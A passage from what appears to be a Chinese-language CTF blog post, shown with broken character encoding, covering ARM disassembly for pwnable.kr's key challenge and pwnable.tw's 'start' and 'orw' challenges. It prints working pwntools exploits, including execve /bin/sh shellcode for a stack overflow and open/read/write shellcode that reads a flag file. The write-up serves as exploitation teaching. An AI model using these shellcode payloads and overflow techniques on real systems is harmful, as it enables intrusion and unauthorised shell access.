&lt;+22&gt;:	adds	r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot;</span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬ä»”ç»†å¯¹ç…§ä¸€ä¸‹æ±‡ç¼–å’Œä½¿ç”¨asmç¼–çš„ä»£ç ï¼Œå‘ç°æœ‰è¿™ä¸ª<code>.code 16</code>å’Œ<code>.code 32</code>ï¼Œè¿™æ˜¯å•¥ï¼Ÿï¼Ÿgoogleä¸€æ³¢å‘ç°æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨ä»£ç æ˜¯armçŠ¶æ€è¿˜æ˜¯thumbçŠ¶æ€ï¼Œä¸è¿‡å’Œè¿™é¢˜æ²¡ä»€ä¹ˆå…³ç³»</p>
<p>æˆ‘ä»¬æŒ‰è¡Œæ³¨é‡Šä¸€ä¸‹ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x00008cfc &lt;+12&gt;:	add	r6, pc, #1  //r6=0x00008d05</span><br><span class="line">0x00008d00 &lt;+16&gt;:	bx	r6  //è·³è½¬åˆ°r6çš„æŒ‡å‘ï¼Œä½†åœ°å€ä¼šå…ˆå’Œ0xFFFFFFFEæŒ‰ä½ä¸ï¼Œç›¸å½“äºjmp 0x00008d04ï¼ˆæœ€åä¸€ä½å¿…ä¸ºå¶æ•°ï¼‰</span><br><span class="line">0x00008d04 &lt;+20&gt;:	mov	r3, pc  //r3=0x00008d08</span><br><span class="line">0x00008d06 &lt;+22&gt;:	adds	r3, #4  //r3=0x00008d0c</span><br><span class="line">0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">0x00008d10 &lt;+32&gt;:	mov	r0, r3  //è¿”å›å€¼r0=r3</span><br></pre></td></tr></table></figure>
<p>ç»“æŸæˆ˜æ–—</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:	mov	r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int key3()&#123;</span><br><span class="line">	asm(&quot;mov r3, lr\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>key3å°±æ˜¯ä¸€ä¸ªç®€å•çš„lrå¯„å­˜å™¨å½“è¿”å›å€¼ï¼Œlrå¯„å­˜å™¨æœ‰ä¸¤ä¸ªç”¨å¤„</p>
<ul>
<li>ä¿å­˜å­ç¨‹åºè¿”å›åœ°å€</li>
<li>å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œå¼‚å¸¸æ¨¡å¼çš„r14ç”¨æ¥ä¿å­˜å¼‚å¸¸è¿”å›åœ°å€</li>
</ul>
<p>æ‰€ä»¥è¿”å›åœ°å€ä¸º<code>   0x00008d80 &lt;+68&gt;:	mov	r3, r0</code>ï¼Œçš„<strong>0x00008d80</strong></p>
<p>æˆ‘ä»¬å¾—åˆ°äº†ä¸‰ä¸ªè¿”å›å€¼ï¼Œç›´æ¥ç›¸åŠ å³ä¸ºkeyï¼Œä¸º0x00008ce4+0x00008d0c+0x00008d80&#x3D;108400ï¼Œç¨‹åºåˆ†æå®Œæ¯•ï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹åˆšæ‰æåˆ°çš„ä¸¤ä¸ªçŠ¶æ€</p>
<h2 id="ARMå¤„ç†å™¨çŠ¶æ€"><a href="#ARMå¤„ç†å™¨çŠ¶æ€" class="headerlink" title="ARMå¤„ç†å™¨çŠ¶æ€"></a>ARMå¤„ç†å™¨çŠ¶æ€</h2><p>æˆ‘ä»¬åˆ†ækey2çš„æ—¶å€™å‘ç°gdbåç¼–è¯‘å‡ºè«åå¥‡å¦™çš„å‡ è¡Œï¼Œæˆ‘ä»¬æ·±å…¥åˆ†æä¸€ä¸‹æºä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot; 	//â‘ </span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;	//â‘¡</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°äº†å¤„ç†â‘ çš„æ—¶å€™ä¸‹ä¸€è¡Œå°±æ˜¯çŠ¶æ€çš„åˆ‡æ¢äº†ï¼Œä¹‹å‰æˆ‘ä»¬çŸ¥é“äº†åœ°å€åœ¨è·³è½¬ä¹‹å‰ä¼šå’Œ<strong>0xFFFFFFFE</strong>è¿›è¡ŒæŒ‰ä½ä¸ï¼Œæœ¬èº«æœ€åä¸€ä½çš„ä½œç”¨æ˜¯èµ·åˆ°äº†ä¸€ä¸ªæ ‡å¿—ä½çš„ä½œç”¨ï¼Œ0ä»£è¡¨çŠ¶æ€armï¼Œ1ä»£è¡¨çŠ¶æ€thumbï¼Œæ‰€ä»¥æ‰ä¼šæ˜¾å¾—å¾ˆå¥‡æ€ªçš„åŠ ä¸€ï¼Œè€Œæœ€åâ‘¡çš„è½¬æ¢å›æ¥è€ƒè™‘åˆ°lrå¯„å­˜å™¨æ”¾å…¥çš„å°±æ˜¯åŸæœ¬åœ°å€ï¼Œæ•…æ‰§è¡Œå®Œ<code>   0x00008d1c &lt;+44&gt;:	bx	lr</code>åç¨‹åºåˆåˆ‡æ¢ä¼šäº†armçŠ¶æ€</p>
<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  ä¸‹è½½ ./start</span><br><span class="line">Let&#x27;s start the CTF:321</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">âœ  ä¸‹è½½ checksec start </span><br><span class="line">[*] &#x27;/home/pic/\xe4\xb8\x8b\xe8\xbd\xbd/start&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060 000 push    esp</span><br><span class="line">.text:08048061 004 push    offset _exit</span><br><span class="line">.text:08048066 008 xor     eax, eax</span><br><span class="line">.text:08048068 008 xor     ebx, ebx</span><br><span class="line">.text:0804806A 008 xor     ecx, ecx</span><br><span class="line">.text:0804806C 008 xor     edx, edx</span><br><span class="line">.text:0804806E 008 push    &#x27;:FTC&#x27;</span><br><span class="line">.text:08048073 00C push    &#x27; eht&#x27;</span><br><span class="line">.text:08048078 010 push    &#x27; tra&#x27;</span><br><span class="line">.text:0804807D 014 push    &#x27;ts s&#x27;</span><br><span class="line">.text:08048082 018 push    2774654Ch</span><br><span class="line">.text:08048087 01C mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089 01C mov     dl, 14h</span><br><span class="line">.text:0804808B 01C mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D 01C mov     al, 4</span><br><span class="line">.text:0804808F 01C int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091 01C xor     ebx, ebx</span><br><span class="line">.text:08048093 01C mov     dl, 3Ch</span><br><span class="line">.text:08048095 01C mov     al, 3</span><br><span class="line">.text:08048097 01C int     80h             ; LINUX -</span><br><span class="line">.text:08048099 01C add     esp, 14h</span><br><span class="line">.text:0804809C 008 retn</span><br></pre></td></tr></table></figure>

<p>æœ¬é¢˜ä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:08048087 01C mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089 01C mov     dl, 14h</span><br><span class="line">.text:0804808B 01C mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D 01C mov     al, 4</span><br><span class="line">.text:0804808F 01C int     80h             ; LINUX - sys_write</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08048091 01C xor     ebx, ebx</span><br><span class="line">.text:08048093 01C mov     dl, 3Ch</span><br><span class="line">.text:08048095 01C mov     al, 3</span><br><span class="line">.text:08048097 01C int     80h             ; LINUX -</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°å®ƒè®©æˆ‘ä»¬å†™ 0x3C ä¸ªå­—ç¬¦,å®Œå…¨å¯ä»¥è¦†ç›–è¿”å›åœ°å€,æœ¬é¢˜æœ‰ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨,ä¸€ä¸ªæ˜¯<code>sys_read(ax=3)</code>,å¦ä¸€ä¸ªä¸º<code>sys_write(ax=4)</code>,å› ä¸ºæœ¬é¢˜çš„<strong>NX</strong>æ˜¯å…³çš„,æˆ‘ä»¬ç›´æ¥åœ¨æ ˆä¸Šå†™<strong>shellcode</strong>å³å¯</p>
<p>è¦åšçš„åªæœ‰:</p>
<ul>
<li>çŸ¥é“<strong>esp</strong>çš„å€¼</li>
<li>å†™<strong>shellcode</strong></li>
</ul>
<p>ç›´æ¥äº¤exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = process(&#x27;./start&#x27;)</span><br><span class="line">pay=&#x27;a&#x27;*20+p32(0x08048087)</span><br><span class="line">p.sendafter(&#x27;CTF:&#x27;,pay)</span><br><span class="line">esp=u32(p.recv(4))</span><br><span class="line">print hex(esp)</span><br><span class="line">pay=&#x27;a&#x27;*20+p32(esp+0x14)+&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶æˆ‘ä»¬è¦æ³¨æ„,ç¬¬ä¸€ä¸ªä¸èƒ½sendline,è¿™æ ·ä¼šç ´åespçš„å€¼,å…¶æ¬¡åœ¨ç¬¬äºŒä¸ªä¼ è¾“çš„æ—¶å€™ä¸è¦æ­»è„‘ç­‹,æƒ³ç€ä¸€å®šè¦å¸ƒç½®åˆ°ç»™å®šçš„20ä¸ªå­—èŠ‚ä¸­,ç›´æ¥è®©<code>esp+20</code>ä¹‹ååœ¨ä»å®¹çš„å¸ƒç½®æ›´åŠ ä¼˜é›…</p>
<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">âœ  ä¸‹è½½ ./orw </span><br><span class="line">Give my your shellcode:12</span><br><span class="line">[1]    9368 segmentation fault (core dumped)  ./orw</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">âœ  ä¸‹è½½ checksec orw</span><br><span class="line">[*] &#x27;/home/pic/\xe4\xb8\x8b\xe8\xbd\xbd/orw&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:08048548 lea     ecx, [esp+4]</span><br><span class="line">.text:0804854C and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804854F push    dword ptr [ecx-4]</span><br><span class="line">.text:08048552 push    ebp</span><br><span class="line">.text:08048553 mov     ebp, esp</span><br><span class="line">.text:08048555 push    ecx</span><br><span class="line">.text:08048556 sub     esp, 4</span><br><span class="line">.text:08048559 call    orw_seccomp</span><br><span class="line">.text:0804855E sub     esp, 0Ch</span><br><span class="line">.text:08048561 push    offset aGiveMyYourShel ; &quot;Give my your shellcode:&quot;</span><br><span class="line">.text:08048566 call    _printf</span><br><span class="line">.text:0804856B add     esp, 10h</span><br><span class="line">.text:0804856E sub     esp, 4</span><br><span class="line">.text:08048571 push    0C8h</span><br><span class="line">.text:08048576 push    offset shellcode</span><br><span class="line">.text:0804857B push    0</span><br><span class="line">.text:0804857D call    _read</span><br><span class="line">.text:08048582 add     esp, 10h</span><br><span class="line">.text:08048585 mov     eax, offset shellcode</span><br><span class="line">.text:0804858A call    eax ; shellcode</span><br><span class="line">.text:0804858C mov     eax, 0</span><br><span class="line">.text:08048591 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048594 leave</span><br><span class="line">.text:08048595 lea     esp, [ecx-4]</span><br><span class="line">.text:08048598 retn</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨è¾“å‡ºå­—ç¬¦ä¸²ä¹‹å‰æœ‰ä¸ª<code>orw_seccomp</code>å‡½æ•°,æ­¤å‡½æ•°ç”¨æ¥é™åˆ¶ç³»ç»Ÿè°ƒç”¨,æˆ‘ä»¬åªèƒ½è°ƒç”¨4ä¸ªå‡½æ•°,ä¸è¿‡å¤Ÿäº†,å…¶ä¸­æœ‰<code>open</code>,<code>write</code>å’Œ<code>read</code>,å®Œå…¨å¯ä»¥æå®š,ç»§ç»­çœ‹æ±‡ç¼–ä»£ç ,<br>æ‰“å°å‡º<code>Give my your shellcode:</code>å,è®©æˆ‘ä»¬åœ¨<code>0C8h</code>ä¸ªå­—èŠ‚é‡Œå†™å…¥æ•°æ®,ä¹‹åç›´æ¥è°ƒç”¨è¿™ä¸ª<code>shellcode</code>,è¡Œ,æˆ‘ä»¬çš„æ€è·¯å¦‚ä¸‹:</p>
<ul>
<li>çŸ¥é“<strong>flag</strong>çš„ä½ç½®</li>
<li>ä½¿ç”¨<code>open</code>æ‰“å¼€flagæ–‡ä»¶</li>
<li>ç”¨<code>write</code>è¯»å‡ºæ–‡ä»¶</li>
<li><code>read</code>æ‰“å°å‡ºæ¥</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;chall.pwnable.tw&quot;, 10001)</span><br><span class="line">shellcode = &quot;&quot;</span><br><span class="line">shellcode += shellcraft.i386.pushstr(&quot;/home/orw/flag&quot;)    </span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_open&quot;, &#x27;esp&#x27;)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_read&quot;, &#x27;eax&#x27;, &#x27;esp&#x27;, 0x30)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_write&quot;, 1, &#x27;esp&#x27;, 0x30)</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/06/25/2019-06-25-kr_1st/" data-id="cuid0rA8fwheV5E0GTdw6VkA6" data-title="pwnable.kr" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/08/08/2019-08-08-some_note/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          ä¸€äº›ç¬”è®°
        
      </div>
    </a>
  
  
    <a href="/2019/06/24/2019-06-24-third/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">å¤§äºŒå‚åŠ å›½èµ›</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/10/01/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2023/06/27/2023-06-27-fuzzer/">å¦‚ä½•å®Œæˆä¸€ä¸ª fuzzer</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-05-31-report/">å®‰å…¨å¼€å‘</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-06-18-fixandPR/">è®°ä¸€æ¬¡ fuzz go çš„ä¸€ä¸ªç¬¬ä¸‰æ–¹åº“</a>
          </li>
        
          <li>
            <a href="/2023/05/23/2023-05-23-waf/">AI å®‰å…¨ä¹‹</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>